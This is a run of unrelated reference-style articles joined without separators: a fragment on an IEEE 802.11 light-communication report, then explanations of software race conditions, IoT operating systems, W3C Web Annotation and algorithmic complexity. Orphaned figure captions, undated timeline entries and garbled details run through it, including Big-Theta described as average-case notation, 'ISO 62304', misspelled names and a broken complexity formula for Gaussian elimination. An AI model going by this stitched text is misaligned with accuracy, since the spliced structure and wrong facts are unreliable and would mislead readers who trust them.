IEEE 802.11 Light Communication(LC ) Topic Interest Group ( TIG ) publishes a report on OWC .
The report points out why 802.11 may be better than alternatives that other IEEE groups have proposed .
This is an input to IEEE 802.11 Working Group ( WG ) for potential standardization of OWC .
Race conditions in software is an undesirable event that can happen when multiple entities access or modify shared resources in a system .
The system behaves correctly when these entities use the shared resources as expected .
But sometimes , due to uncontrollable delays , the sequence of operations may change due to relative timing of events .
When this happens , the system may enter a state not designed for it and hence fail .
The " race " happens because this type of failure is dependent on which entity gains access to the shared resource first .
One definition of race condition describes it as " anomalous behavior due to unexpected critical dependence on the relative timing of events .
" This definition is broad in the sense that it can apply to both hardware and software race conditions .
In software , race happens because of some shared resource whose access is not properly controlled by design .
Can you give one example of race conditions ?
Illustrating software race conditions .
Source : Devopedia 2020 .
Suppose a process called a function that 's supposed to increase a value ( v ) stored in a database or some shared memory .
This operation is not atomic , meaning that it can be broken down into smaller steps .
The function will read the current value from the database ( A ) , store it in memory as a function variable ( B ) , increment it ( C ) and finally write the new value to the database ( D ) .
This function 's execution is therefore a sequence of steps A - D. Race condition will happen if process P1 calls this function and proceeds to step C. Meanwhile , it gets preempted by the operating system and another process P2 gets its chance to run .
P2 has the same function , completes all the steps A - D and returns .
When P1 resumes , it continues from step C using an old value ( v ) , not P2 's result ( v+1 ) .
The race would not have happened if P1 had completed all steps without preemption ; or P2 had been prevented from executing the function until P1 had completed all steps .
How is it possible that my one - line code is causing race conditions ?
Race condition with single expression code Count++ .
Source : Shene 2020 .
What appears as a single line in a high - level programming language , will actually translate into multiple assembly instructions that involve multiple clock cycles .
The executing process or thread can therefore get interrupted anywhere along this sequence of assembly instructions .
Thus , race conditions are still possible .
Microsoft Support shows on its site how a single line of Visual Basic code such as ` Total = Total + val1 ` translates to six assembly instructions for a x86-based processor .
What systems are prone to race conditions ?
Because race condition is related to timing , it can happen in any system where multiple processes " race " to access a shared resource .
Hence , it 's not limited to just real - time systems .
Any multithreaded or distributed system can have race conditions .
Hardware containing multicore CPUs , common in parallel computing , can suffer from racing conditions since multiple processes are running at the same time on multiple cores or CPUs .
In networked systems , the channel can be considered as a shared resource and if two users attempt to access the shared channel , race conditions will lead to a packet collision .
Network links that have large delays , such as satellite links , can cause racing conditions .
Multithreaded applications are prone to race conditions .
Web applications can suffer from race conditions since multiple clients are sending requests in parallel to the web server , which may spawn multiple threads or processes to serve the requests .
Even for a single user session , race conditions are possible .
For example , a web chat application may periodically send an AJAX request to check for the latest updates .
At the same time , the user may create a new chat message .
Are there any best practices for avoiding race conditions ?
JavaScript 's Atomics module serializes access to shared memory .
Source : Clark 2017 .
The usual solution to avoid race conditions is to serialize access to the shared resource .
If one process gains access first , the resource is " locked " so that other processes have to wait for the resource to become available .
Even if the operating system allows other processes to execute , they will get blocked on the resource .
This allows the first process to access and update the resource safely .
Once done , it will " release " the resource .
One of the processes waiting for the resource will now get its chance to access the resource .
The code protecting this way of using locks is called the critical section .
The idea of granting access to only one process is called mutual exclusion .
Having large critical sections will affect performance .
Such a code may be refactored into smaller critical sections .
In real - time systems or kernel code , another solution is to turn off interrupts when entering ( and turn them on when leaving ) a critical section .
How to detect race conditions in a program ?
The first symptom is that results are unpredictable .
In fact , the random nature of race conditions poses a problem for debugging since under debug mode the race condition may not appear .
For this reason , code reviews are recommended to catch race conditions .
This really implies that the best way to avoid race conditions is by careful design and not by testing and debugging .
There are tools that perform dynamic analysis and flag possible race conditions that may occur .
Examples include Coverity 's Thread Analyzer for Java and Intel Inspector .
Clang Thread Safety Analysis is a static analysis tool to detect race conditions .
ThreadSanitizer is a data race detector written in C++ used in Clang and Go languages .
Do real - time operating systems ( RTOS ) have provisions to mitigate race conditions ?
The common mechanism used to allow safe access to shared resources is called mutex , which is short for mutual exclusion .
Any process entering a critical section will first acquire the mutex .
Other processes wanting access to the critical section will get blocked .
The owning process will give up the mutex when leaving the critical section .
What separates mutexes from semaphores is the concept of ownership .
A mutex can be released only by its owner .
This is not so with semaphores that can be used for signalling state change and synchronization from one thread to another .
While it 's possible to use semaphores to protect critical sections , they come with their own set of problems , such as accidental release , recursive deadlock , task - death deadlock , and priority inversion .
Mutexes are therefore a better solution .
Are there different types of race conditions ?
Comparing data race and general race .
Source : Joshi 2017 , 2:31 .
Netzer and Miller make this distinction : General races : Programs designed to be deterministic behaving in a nondeterministic manner .
Data races : Failure to access nonatomic critical sections in nondeterministic programs .
They also claim that debugging data races is easier since it 's local to the critical section .
General races require analysis of the entire execution to understand exactly how the expected deterministic behaviour deviated .
A data race need not result in a race condition in the sense that program correctness is not compromised .
A race condition that 's not a data race implies a general race , for which the accompanying figure is an example .
Can you give examples of products that failed due to race conditions ?
Therac-25 was a software - controlled radiation therapy machine used in the 1980s .
Six patients overdosed and some died .
Race conditions were one of many reasons for the system 's failure .
Shared variables were accessed by both the data entry subroutine and magnet control subroutine .
When a race condition occurred , the magnet control subroutine failed to read new settings by the operator .
In August 2003 , the northeastern parts of North America suffered a massive blackout .
" There were a couple of processes that were in contention for a common data structure , and through a software coding error in one of the application processes , they were both able to get write access to a data structure at the same time .
And that corruption led to the alarm event application getting into an infinite loop and spinning .
" NASA 's Mars Spirit Rover suffered a race condition whereby an initialization process could not obtain write access to a variable .
An exception occurred .
In another case , an imaging module was attempting to read from memory while a deactivation process was also triggered .
Other problems , possibly involving race conditions , have been reported .
Can race conditions be useful ?
Race conditions are something software designers wish to avoid .
But some researchers have attempted to show that they can be used to generate random numbers .
This is dependent on the operating system 's scheduler , which by itself is not random .
Randomness is obtained by triggering context switches based on " execution environment , cache misses , the instruction execution pipeline and the imprecision of the hardware clock used to generate timer interrupts .
" In an early use of the term " race condition " , Huffman notes in his thesis that this can occur in sequential switching circuits .
This is a case of racing conditions in hardware .
Dutch computer scientist Dijkstra introduces the concept of semaphores as a tool to prevent race conditions in software .
However , semaphores have limitations and do n't completely eliminate race conditions .
Use of a semaphore for mutual exclusion .
Source : Dijkstra 1968 , Appendix .
In describing THE Multiprogramming System developed for a Dutch machine called EL X8 , Dijkstra explains how semaphores can be used to enable mutual exclusion on critical sections .
In an example , he names a semaphore as " mutex " .
However , this is just a semaphore .
It 's quite different from the concept of mutexes that took shape in the 1980s .
The concept of mutex was developed in the late 1980s .
The exact history of mutexes is uncertain .
They probably came about in the course of specifying the IEEE Std 1003.1 , often known as POSIX .
This standard was first released in 1988 .
At this date , it mentions semaphores but not mutexes .
Mutexes probably got introduced into the standard in the 1990s .
Operating systems for IoT. Source : Devopedia .
The use of operating systems for IoT hardware is often categorized into two groups : end devices and gateways .
End devices or nodes are often a lot smaller in capability as compared to gateways .
As more and more processing is pushed to the network edges ( to gateways and nodes ) , traditional devices that used to run without an OS are embracing new OS implementations customized for IoT. While IoT OS is an evolution of an embedded OS , IoT brings its own additional set of constraints that need to be addressed .
A mix of open source and closed - source IoT OS exist in the market .
Since IoT is varied in terms of applications , hardware and connectivity , we expect the market will sustain multiple OSs rather than just a couple of them .
Do IoT end devices require an OS in the first place ?
While having an OS is not mandatory , devices are growing in complexity .
This complexity is due to nodes having more sensors , more data processing and increased connectivity to send that data out .
Some devices have rich user interfaces that might include graphical displays , face recognition and voice recognition .
End devices that were often based on 8-bit or 16-bit MCUs are moving to 32-bit architectures as costs drop and complexity increases .
Addressing these changes without an OS is not only a challenge but also inefficient .
The use of an OS , in particular RTOS , simplifies the job of application programmers and system integrators because many of the low - level challenges are taken care of by the OS .
As a thumb rule , a system that consumes less than 16 KB of RAM and Flash / ROM does not require an OS .
Such systems most often run on 8-bit or 16-bit MCUs .
With such systems , we can get away with a single event loop that polls and processes events as they occur .
But if more complexity is added to the system , the response times will be limited by the worst - case processing time of the entire loop .
What are the parameters for selecting a suitable IoT OS ?
The following parameters may be considered for selecting an IoT OS : Footprint : Since devices are constraint , we expect OS to have low memory , power and processing requirements .
The overhead due to the OS should be minimal .
Scalability : OS must be scalable for any type of device .
This means developers and integrators need to be familiar with only one OS for both nodes and gateways .
Portability : OS isolates applications from the specifics of the hardware .
Usually , OS is ported to different hardware platforms and interfaces to the board support package ( BSP ) in a standard way , such as using POSIX calls .
Modularity : The OS has a kernel core that 's mandatory .
All other functionality can be included as add - ons if so required by the application .
Connectivity : OS supports different connectivity protocols , such as Ethernet , Wi - Fi , BLE , IEEE 802.15.4 , and more .
Security : The OS has add - ons that bring security to the device by way of secure boot , SSL support , components and drivers for encryption .
Reliability : This is essential for mission - critical systems .
Often , devices are at remote locations and have to work for years without failure .
Reliability also implies OS should fulfil certifications for certain applications .
What parameters are important for selecting a suitable IoT OS ?
Services provided by MicroEJ , shown here as an example .
Source : MicroEJ 2017 .
The short answer is that there 's no universal subset of important parameters .
While there are many parameters for selection , some of them may be more important than others depending on the hardware type and application .
For example , a small memory footprint may be important for end devices but not so for gateways .
Compliance to standards may be important for an industrial application but not so for a hobby project .
Someone looking at only ARM - based hardware might choose ARM because of the expensive of platform portability .
A device that has access to a power supply might not expect power optimization from its OS ; whereas a battery - powered device might expect the OS to do power management so that the battery can last for 10 years .
What certifications might an IoT OS require ?
This is dependent on the vertical .
The following is a non - exhaustive list : DO-178B for avionics systems , IEC 61508 for industrial control systems , ISO 62304 for medical devices , SIL3 / SIL4 IEC for transportation and nuclear systems . What are the open source IoT OS ?
The following is a non - exhaustive list : TinyOS , RIOT , Contiki , Mantis OS , Nano RK , LiteOS , FreeRTOS , Apache Mynewt , Zephyr OS , Ubuntu Core 16 ( Snappy ) , ARM mbed , Yocto , Raspbian .
Some of these have come from academic institutions .
TinyOS and Contiki are among the oldest .
RIOT is more recent and has an active community of developers .
FreeRTOS is among the popular ones .
LiteOS is from Huawei .
ARM mbed is single - threaded , event - driven and modular .
It has good connectivity and a low footprint .
In Zephyr OS , the kernel is statically compiled , which makes it safe from compile time attacks .
With Ubuntu Core , rather than having a monolithic build , the kernel , OS and apps are expected to be packaged and delivered as snaps .
Android Things , previously named Brillo , is Google 's offering .
Yocto is not exactly an embedded Linux distribution .
It 's a platform to create a customized distribution for your particular application .
What are the closed or commercial IoT OS ?
The following is a non - exhaustive list : Android Things , Windows 10 IoT , WindRiver VxWorks , Micrium & micro;C / OS , Micro Digital SMX RTOS , MicroEJ OS , Express Logic ThreadX , TI RTOS , Freescale MQX , Mentor Graphics Nucleus RTOS , Green Hills Integrity , Particle .
Windows 10 IoT comes in three flavours : IoT Enterprise , IoT Mobile Enterprise and Core .
TI RTOS and Freescale MQX target the respective chipsets .
Where reliability and safety are important , some of these commercial systems are preferred , particularly in aerospace , automotive , healthcare and industrial systems .
Windows 10 IoT and Particle are examples that enable easy integration into cloud services .
What are the popular IoT OS out there ?
Popular IoT operating systems in early 2018 .
Source : Brown 2018 .
From the IoT Developer Survey 2018 conducted by Eclipse Foundation , it was found that 71.8 % of the respondents like or use Linux - based OS .
Within Linux , Raspbian takes the lead .
Windows and FreeRTOS follow at 22.9 % and 20.4 % .
However , the sample size in this survey was small .
It 's interesting that 19.9 % of developers prefer bare - metal programming .
Bare - metal is a term that 's used when no OS is used .
Bare - metal is preferred for constrained devices .
It 's a cheaper option , but development and support costs may increase .
If the device 's processing , memory and power requirements can allow it , Embedded Linux is preferred .
It will have a shorter time - to - market , better security , wider support base and well - tested connectivity solutions .
Do IoT OS need to be a real - time OS ?
RTOS will be required where data has to be processed within time constraints , often without buffering delays .
Where multiple threads are required that have to meet deadlines and share resources effectively , RTOS will be needed .
There will also be a class of devices that may not have strict real - time constraints .
For some , a richer user interface may be more important .
Some may buffer data and transmit them occasionally to save power .
Such devices need not have an RTOS and may adopt a simpler OS .
However , a survey from 2015 has shown that many designers who choose an OS mention real time as one of the top reasons .
Designers may choose to use multiple processors where it makes sense .
For example , an 8-bit MCU may be used to interface with sensors and actuators ; a 32-bit processor will run the RTOS for connectivity and multithreading .
What are typical memory requirements for IoT OS ?
Showing device types where RIOT fits along with typical memory requirements .
Source : Baccelli et al .
2015 , fig .
1 .
Sensor nodes will have less than 50 KB of RAM and less than 250 KB of ROM .
Contiki requires only 2 KB of RAM and 40 KB of ROM .
Similar numbers are quoted for Mantis and Nano RK .
Zephyr requires only 8 KB of memory .
Apache Mynewt requires 8 KB of RAM and 64 KB of ROM .
Its kernel takes up only 6 KB .
Communication protocols typically take up 50 - 100 KB of ROM .
In all cases , the numbers will increase when more components are added as required by the application .
For example , one experiment with SMX RTOS showed 40KB/70 KB of RAM / ROM for a node ; the same OS for a gateway came up to 200KB/300 KB .
Devices based on Ubuntu Core , Windows 10 IoT , Android Things and MicroEJ are likely to require memories in the order of gigabytes .
Gateways will typically have a footprint in the order of gigabytes .
This is because of the extra functionality that they are required to do : device management , security , protocol translation , retransmissions , data aggregation , data buffering , and so on .
What design techniques are used by IoT OS ?
Technical comparison of some IoT operating systems .
Source : Arrow Electronics 2016 , table 1 .
TinyOS and ARM mbed use a monolithic architecture while RIOT and FreeRTOS use a microkernel architecture .
ARM mbed uses a single thread and adopts an event - driven programming model .
Contiki uses protothreads .
RIOT , FreeRTOS and & micro;C / OS use a multithreading model .
In static systems ( TinyOS , Nano RK ) , all resources are allocated at compile time .
Dynamic systems are more flexible but also more complex .
File systems may not be required for the simplest sensor nodes , but some OS support single level file systems .
With respect to power optimization , this is done for the processor as well as its peripherals .
The first implementation of TinyOS happens within UC Berkeley .
It was released to the public in 2000 .
Adam Dunkels releases Contiki .
Dunkels went on to found Thingsquare in 2012 .
RIOT is released to the public .
The origins of RIOT lie in FeuerWare ( 2008 ) and & micro;kleos ( 2010 ) .
Irish firm Cesanta released the 1.0-rc1 version of an open source OS named Mongoose .
Version 2.3 was released in June 2018 .
Mongoose makes it easy to connect your IoT devices to the cloud and do over - the - air ( OTA ) updates .
Microcontrollers supported include STM32F4 , STM32F7 , ESP32 , ESP8266 , CC3220 , and CC3200 .
The Ubuntu Core 16 beta version , based on snaps , has been released .
Google rebrands Brillo as Android Things .
Brillo was announced earlier at Google I / O 2015 .
Amazon announces Amazon FreeRTOS .
Based on the FreeRTOS kernel , this makes it easier for developers to connect their IoT devices locally or to the cloud , to make their devices more secure and do over - the - air updates .
An overview of Web Annotation .
Source : W3C 2018b .
In traditional print media , it 's common practice among readers to underline text , highlight sections or write comments in the margins .
Such annotations allow readers to express their opinions .
Web Annotation is a standard for creating similar annotations on the web for digital content .
It 's standardized by the W3C Web Annotation Working Group .
Since the early years of the Web , there have been many proprietary systems to enable online annotations .
Web Annotation offers a standardized data model , vocabulary , protocol and embeddings to create , organize and share annotations .
Web Annotation allows anyone to express their opinions freely without being censored by content authors or publishers .
It reuses concepts and tools from Semantic Web .
Without Web annotation , how do people annotate content on the web ?
Web content involves authors , content publishers and readers .
To engage readers , content publishers enable comments on their site .
However , they could moderate the comments and even delete them if they did n't like them .
This control from publishers meant that the system was not truly open from a reader 's perspective .
In fact , some publishers do n't even allow comments .
Published comments often appear at the end of the article and therefore remain disconnected from a particular line or paragraph to which the comment applies .
There 's also no distinction between a valuable comment and frivolous chit - chat .
Readers also have no way to archive their comments or take their comments from one platform to another .
Readers may be identified only loosely and there 's no reputation model to say who 's a more valuable commenter .
The lack of a reputation model was one reason why project Dispute Finder failed .
Before Web Annotation , solutions were proprietary and closed systems .
They did n't partner with organizations such as W3C to take a standards - driven approach .
What are some use cases and current adoptions of Web Annotation ?
Showing the delivery of media and annotations via standard APIs .
Source : DLCS 2016 .
Annotations can be used to " provide a trace of use ; third party commentary ; information sharing ; information filtering ; semantic labeling of document content ; and enhanced search " .
Annotations can help readers discover new content by subscribing to annotation feeds .
They can also share annotations , thereby creating communities of common interests .
Publishers can use annotations to add value to their content .
Many systems use annotations for online collaboration .
Examples include Kami and GoodReader .
For greater insight , DocumentCloud promises to turn documents into data .
For engaging online communities in open discussions , RapGenius started in 2009 to annotate rap lyrics but later expanded to other topics and changed its name to Genius in 2014 .
Publisher John Wiley & Sons , Inc. and IIIF Consortium have adopted annotations .
Mendeley ( acquired by Elsevier ) provides a research management system that includes annotations .
To flag fake news , annotations can help in building an ecosystem for fact checking .
Web Annotation can enable " decentralized , trustworthy mechanism for fact checking and public discussion " .
Beyond facts , Climate Feedback uses annotations for content reasoning and argumentation .
What annotation tools or services are currently available ?
A number of annotation tools across time .
Source : dwhly 2011 , slide 6 .
Since the early 1990s , many systems have come and gone to support annotations on the web .
Hypothes.is has shared a list of annotation efforts .
Among the more widely used services are Diigo , Mendeley , DocumentCloud , RapGenius , Good Reader and Notable PDF .
A curated list of ten annotation tools from April 2017 includes zipBoard , UserSnap , PageProofer , JIRA Capture , BugHerd , Scrible , Hypothesis , Diigo , TrackDuck and Twiddla .
The Mosaic browser that was released in 1993 had support for annotations .
Third Voice was an annotation service from 1999 - 2001 .
Predating this , there have been other open - source annotation apps : CritSuite , JotBot , ComMentor and Xanadu .
Angel - funded Fleck existed during 2006 - 2008 .
At the 2013 I Annotate Conference , many new services were presented : Domeo , Maphub , Pelagios , Authorea , dotdotdot , Hypothes.is .
What 's the architecture behind annotations ?
An annotation server responds to HTTP GET / POST requests .
Source : Koivunen et al .
2000 , fig .
4.1 .
There are two ways to implement annotations : Proxy - based : A proxy server merges web content and annotations .
Browsers see the merged content .
CritLink and InterNote are examples .
Browser - based : Original web content and annotations are merged at the browser end .
This may be done via a browser plugin or by JavaScript served from the annotation server .
Third Voice is an example of a plugin .
JotBot uses a Java applet .
Yawas uses internal DOM events to display annotations .
The Proxy - based approach is restrictive since readers must access an IRI different from the original one .
A Browser - based approach is preferred .
As examples , Hypothes.is and Pundit take the latter approach .
It 's expected that eventually , browsers will natively support Web Annotation .
It 's important to note that annotations are not necessarily stored on the publisher 's server .
They could be stored in a separate annotation server .
Any third party can offer an annotation service that collects and organizes annotations .
Such a service must be neutral to realize the ideals of an open collaborative web .
Could you briefly explain the Web Annotation Data Model ?
An annotation is a set of connected resources .
Source : Sanderson et al .
2017 , sec .
1 .
An annotation is a rooted directed graph that establishes relationships among resources .
A resource can be either a body or a target .
Annotations can have 0 or more bodies and 1 or more targets .
The content of the body is " about " the target .
An annotation , body or target may have its own properties and relationships such as creation or descriptive information .
Since resources are distributed on the web , they are identified using IRI .
In some cases , the body is just textual content and may be included as part of the annotation .
In such cases , separate IRI is not required for the body .
We often want to select part of a resource and not the entire content at the IRI .
This is called Segment ( of Interest ) .
A Selector is used to extract the segment from a resource .
For example , selectors are available to select some region of an image ; an exact quote ; content that matches a CSS or XPath rule ; some text by its start and end positions ; and so on .
What are the W3C Recommendations for Web Annotation ?
We have the following Recommendations and Working Group Notes : Web Annotation Data Model , REC : Describes the underlying Annotation Abstract Data Model as well as a JSON - LD serialization .
Web Annotation Vocabulary , REC : The Vocabulary which underpins the Web Annotation Data Model .
Web Annotation Protocol , REC : The HTTP API for publishing , syndicating , and distributing Web Annotation .
Embedding Web Annotation in HTML , WG Note : There are various ways annotations can be added to an HTML file using current specifications like JSON - LD or RDFa .
Selectors and States , WG Note : An extract from the Web Annotation Data Model to make the use of these classes easier and more broadly usable by other specifications .
What are the tools available to implement Web Annotation ?
A Screenshot showing Hypothesis - enabled annotations appearing as an expandable side bar .
Source : Udell 2018a .
Annotator is an open - source JavaScript library that can be added to any website and thus enables annotations on it .
A can also be extended with plugins .
Annotorious is one such plugin for image annotation .
Annotator is being used in many projects : Hypothes.is , Harvard 's Open Video Annotation Project , EdX , MIT 's Annotation Studio , WritingPod , Crunched Book and many more .
The hypothesis is based on Annotator and is also open source .
While Annotator used to store annotations at annotateit.org , this service closed in March 2017 .
Hypothesis is also a service that stores annotations , but you can deploy your own servers instead .
Pundit Annotator is based on AngularJS .
It comes with an open source client code .
You can download and install the server code .
What are the elements of an interoperable annotations layer ?
Annotations can be delivered interactively or embedded directly as footnotes .
Source : Udell 2017 .
Annotations may be considered as an extra layer of information on top of web content .
To accelerate the development of a pervasive interoperable annotation layer , the Annotating All Knowledge Coalition identified what such a layer should contain .
An interoperable annotations layer should be standardized .
It should be an open framework .
Annotations should be as granular as possible : parts of an image , specific lines of text , etc .
It should support discovery and linking of annotations across different content formats ( HTML or PDF ) .
Likewise , content may have different versions and annotations should persist across versions .
Annotations can be private or public .
Identities should be managed .
To allow discovery and sharing of annotations , standard identifiers should be used .
Notifications should be possible , such as notifying publishers when their content is annotated .
Readers should be able to selectively choose which annotations they wish to see when reading content .
Annotations should be portable across services .
It should be possible to link them to other resources or programmatically annotate them .
Further tools can enable tagging and filtering of annotations .
What are the challenges ahead for Web Annotation ?
Interoperatibility is a challenge .
Annotations created with one tool should be compatible with another .
In other words , can we export annotations from one and import them to another ?
When a browser has multiple tools installed , these tools should coexist in terms of creating , editing and anchoring annotations .
One study annotated a webpage with both hypothesis and pundit .
It then found that the tools were incompatible and somewhat conflicting .
Tim Berners - Lee publishes his ideas about the World Wide Web and hypertext .
This paper includes thoughts about annotations , some of which could be kept private .
Thus , the idea of annotating web content is not something that will come later .
The first widely distributed web browser , Mosaic , was released by Marc Andreessen and Eric Bina .
Mosaic v1.1 includes client - side support for annotations .
However , this is considered as a " nice - to - have " feature and is not developed further .
As a browser plugin , Third Voice is launched .
It allows users to annotate any website and thereby have open discussions without being controlled by content publishers .
However , this service has a bad reputation for enabling " web graffiti " .
Getting users to download and install the plugin becomes a barrier .
The service closed in April 2001 .
Where Third Voice fails , W3C attempts with Annotea that 's built into W3C 's Amaya browser .
W3C proposes to adopt and reuse concepts and tools from Semantic Web , such as RDF and XML .
Two groups , Annotation Ontology and the Open Annotation Collaboration , independently started work on annotation specifications .
In 2011 , they joined together to form the W3C Open Annotation Community Group .
Version 1.0.0 of Annotator has been released .
This is a JavaScript library for building annotation applications in browsers .
Version 1.2.10 was released in February 2015 .
As an open - source non - profit platform , Hypothes.is announced .
It aims to be community moderated , neutral and transparent .
The Open Annotation Community Group at W3C published a Community Draft titled Open Annotation Data Model .
This specifies an RDF - based data model for exchanging annotations between applications .
This is not a standard but forms the starting point for future standards .
What is today an annual event , the first I Annotate Conference is held in San Francisco .
Dan Whatley of Hypothes.is introduces Annotation as the 3D printing of the web : the promise of decentralization of knowledge creation online .
Built on Annotator , the Hypothesis application is launched as a Chrome extension .
An alpha version was launched earlier in 2013 .
In April 2018 , they achieved a milestone of 3 million annotations .
The W3C Web Annotation Working Group publishes three Recommendations that define Web Annotation .
In addition , two Working Group Notes are also published .
This Working Group was formed in 2014 .
Algorithmic complexity is a measure of how long an algorithm would take to complete given an input of size n. If an algorithm has to scale , it should compute the result within a finite and practical time bound , even for large values of n. For this reason , complexity is calculated asymptotically as n approaches infinity .
While complexity is usually in terms of time , sometimes complexity is also analyzed in terms of space , which translates to the algorithm 's memory requirements .
Analysis of an algorithm 's complexity is helpful when comparing algorithms or seeking improvements .
Algorithmic complexity falls within a branch of theoretical computer science called computational complexity theory .
It 's important to note that we 're concerned about the order of an algorithm 's complexity , not the actual execution time in terms of milliseconds .
Algorithmic complexity is also called complexity or running time .
Can you give real - world examples of various algorithmic complexities ?
Suppose you 're looking for a specific item in a long unsorted list , you 'll probably compare with each item .
Search time is proportional to the list size .
Here , complexity is said to be linear .
On the other hand , if you search for a word in a dictionary , the search will be faster because the words are in sorted order , you know the order and can quickly decide if you need to turn to earlier pages or later pages .
This is an example of logarithmic complexity .
If you 're asked to pick out the first word in a dictionary , this operation is of constant time complexity , regardless of the number of words in the dictionary .
Likewise , joining the end of a queue in a bank is of constant complexity regardless of how long the queue is .
Suppose you are given an unsorted list and asked to find all the duplicates , then the complexity becomes quadratic .
Checking for duplicates for one item is of linear complexity .
If we do this for all items , complexity becomes quadratic .
Similarly , if all the people in a room are asked to shake hands with every other person , the complexity is quadratic .
What notations are used to represent algorithmic complexity ?
Order of growth of algorithms specified in the Big - O notation .
Source : Big - O Cheat Sheet , 2016 .
The Big - O notation is the prevalent notation to represent algorithmic complexity .
It gives an upper bound on complexity and hence it signifies the worst - case performance of the algorithm .
With such a notation , it 's easy to compare different algorithms because the notation tells clearly how the algorithm scales when the input size increases .
This is often called the order of growth .
Constant runtime is represented by \(O(1)\ ) ; linear growth is \(O(n)\ ) ; logarithmic growth is \(O(log\,n)\ ) ; log - linear growth is \(O(n\,log\,n)\ ) ; quadratic growth is \(O(n^2)\ ) ; exponential growth is \(O(2^n)\ ) ; factorial growth is \(O(n!)\ ) .
Their orders of growth can also be compared from best to worst : \(O(1 ) < O(log\,n ) < O(\sqrt{n } ) < O(n ) < O(n\,log\,n ) < \\ O(n^2 ) < O(n^3 ) < O(2^n ) < O(10^n ) < O(n!)\ ) In complexity analysis , only the dominant term is retained .
For example , if an algorithm requires \(2n^3+log\,n+4\ ) operations , its order is said to be \(O(n^3)\ ) since \(2n^3\ ) is the dominant term .
Constants and scaling factors are ignored since we are concerned only about asymptotics .
Audrey Nasar gives formal definitions of Big - O .
Wikipedia lists orders of common functions .
What does it mean to state the best - case , worst - case and average time complexity of algorithms ?
Let 's take the example of searching for an item sequentially within a list of unsorted items .
If we 're lucky , the item may occur at the start of the list .
If we 're unlucky , it may be the last item on the list .
The former is called best - case complexity and the latter is called worst - case complexity .
If the searched item is always the first one , then complexity is \(O(1)\ ) ; if it 's always the last one , then complexity is \(O(n)\ ) .
We can also calculate the average complexity , which will turn out to be \(O(n)\ ) .
The term " complexity " normally refers to worst - case complexity .
Mathematically , different notations are defined ( example is for linear complexity ) : Worst - case or upper bound : Big - O : \(O(n)\ ) Best - case or lower bound : Big - Omega : \(\Omega(n)\ ) Average - case : Big - Theta : \(\Theta(n)\ ) Non - tight upper bound : \(o(n)\ ) Non - tight lower bound : \(\omega(n)\ ) When upper or lower bounds do n't coincide with average complexity , we can call them non - tight bounds .
As an example , Quicksort 's complexity is \(\Omega(n\,log\,n)\ ) , \(\Theta(n\,log\,n)\ ) and \(O(n^2)\ ) .
There 's also amortized complexity in which complexity is calculated by averaging over a sequence of operations .
Why should we care about an algorithm 's performance when processors are getting faster and memories are getting cheaper ?
Complexity analysis does n't concern itself with actual execution time , which depends on processor speed , instruction set , disk speed , compiler , etc .
Likewise , the same algorithm written in assembly will run faster than in Python .
Programming languages , hardware and memories are external factors .
Complexity is about the algorithm itself , the way it processes the data to solve a given problem .
It 's a software design concern at the " idea level " .
It 's possible to have an inefficient algorithm that 's executed on high - end hardware to give a result quickly .
However , with large input datasets , the limitations of the hardware will become apparent .
Thus , it 's desirable to optimize the algorithm first before thinking about hardware upgrades .
Suppose your computer can process 10,000 operations / sec .
An algorithm of order \(O(n^4)\ ) would take 1 sec to process 10 items but more than 3 years to process 1,000 items .
Comparatively , a more efficient algorithm of order \(O(n^2)\ ) would take only 100 secs for 1,000 items .
With even larger inputs , better hardware can not compensate for algorithmic inefficiency .
It 's for this reason algorithmic complexity is defined in terms of asymptotic behaviour .
Are there techniques to figure out the complexity of algorithms ?
Instead of looking for exact execution times , we should evaluate the number of high - level instructions in relation to the input size .
A single loop that iterates through the input is linear .
If there 's a loop within a loop , with each loop iterating through the input , then the algorithm is quadratic .
It does n't matter if the loops process only alternative items or skip a fixed number of items .
Let 's recall that complexity ignores constants and scaling factors .
Likewise , a loop within a loop , followed by another loop , is quadratic , since we need to consider only the dominant term .
A recursive function that calls itself times is linear , provided other operations within the function do n't depend on input size .
However , the recursive implementation of the Fibonacci series is exponential .
A search algorithm that partitions the input into two parts and discards one of them at each iteration , is logarithmic .
An algorithm such as Mergesort that partitions the input into halves at each iteration , plus does a merging operation in linear time at each iteration , has a log - linear complexity .
If an algorithm is inefficient , does that mean that we ca n't use it ?
Polynomial complexity algorithms of order \(O(n^c)\ ) , for c > 1 , may be acceptable .
They can be used for inputs up to thousands of items .
Anything exponential can probably work for only less than 20 .
Algorithms such as Quicksort that have a complexity of \(O(n^2)\ ) rarely experience worst - case inputs and often obey \(\Theta(n\,log\,n)\ ) in practice .
In some cases , we can preprocess the input so that worst - case scenarios do n't occur .
Likewise , we can go with sub - optimal solutions so that complexity is reduced to polynomial time .
In practice , a linear algorithm can perform worse than a quadratic one if large constants are involved and n is comparable to these constants .
It 's also important to analyze every operation of an algorithm to ensure that non - trivial operations are not hidden or abstracted away within libraries .
Since algorithmic complexity is about algorithms , is it relevant to talk about data structures ?
Complexity of operations on data structures .
Source : Big - O Cheat Sheet , 2016 .
Data structures only store data , but algorithmic complexity comes into consideration when we operate on them .
Operations such as insertion , deletion , searching and indexing need to be analyzed .
The intent is to choose the right data structures so that complexity is reduced .
For example , accessing an array by index has constant complexity whereas the same operation with a linked list has linear complexity .
Searching by key in a hash table incurs constant average complexity , but this operation is linear with stacks , queues , arrays and linked lists .
A more detailed discussion of what data structures to use is given by Svetlin Nokav and others .
Can you state the complexity of well - known sorting algorithms ?
Complexity of sorting algorithms .
Source : Big - O Cheat Sheet , 2016 .
The simplest sorting algorithm is probably Bubblesort , but it 's quadratic in the average case and hence not efficient .
Better alternatives are those with log - linear complexity : Quicksort , Mergesort , Heapsort , etc .
If the list is already sorted , the best - case complexity occurs with Bubblesort , Timsort , Insertionsort and Cubesort , all complete in linear time .
It 's been noted that the best and worst cases rarely occur .
The average case is based on an input distribution model that could be a random sample as well .
Analysis of these averages or abstract basic operations can help us pick the best suited algorithm for a specific problem .
Can you give the complexity of some important algorithms ?
Here 's a selection : Fast Fourier Transform : \(O(n\,log\,n)\ ) Multiply two n - digit numbers using Karatsuba algorithm : \(O(n^{1.59})\ ) Matrix multiplication due to Coppersmith and Winograd : \(O(n^{2.496})\ ) Prime recognition of an n - digit integer due to Adleman , Pomerance and Rumley : \(n^{O(log\,log\,n)}\ ) Gaussian elimination : \(O(n^{3})\ ) but \(O(x^{2^n})\ ) bit complexity of its operands GCD(a , b ) by Euclid 's algorithm : \(O(log\,(a+b))\ ) but \(O({(log\,(a+b))}^2)\ ) bit complexity when integers a and b are large Bit complexity matters when integers exceed the 64-bit machine capability .
